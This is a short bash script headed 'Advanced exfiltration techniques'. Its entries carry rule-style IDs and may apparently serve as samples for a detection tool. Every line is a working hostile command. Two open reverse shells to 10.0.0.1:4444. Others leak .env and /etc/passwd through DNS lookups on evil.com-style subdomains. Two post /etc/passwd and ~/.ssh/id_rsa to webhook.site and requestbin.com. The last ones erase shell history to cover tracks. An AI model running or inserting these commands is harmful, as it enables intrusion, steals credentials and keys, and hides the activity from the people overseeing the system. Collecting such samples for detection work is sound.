#!/bin/bash
# Advanced exfiltration techniques

# SR-EXFIL-005: Reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc 10.0.0.1 4444 -e /bin/bash

# SR-EXFIL-006: DNS subdomain exfiltration (CVE-2025-55284)
ping $(cat .env | base64).evil.com
nslookup $(cat /etc/passwd | xxd -p).exfil.example.com

# SR-EXFIL-008: Webhook exfiltration
curl -X POST https://webhook.site/abc123 -d @/etc/passwd
curl https://requestbin.com/test -d "$(cat ~/.ssh/id_rsa)"

# SR-STEALTH-003: Cover tracks
history -c
unset HISTFILE
export HISTSIZE=0
rm ~/.bash_history
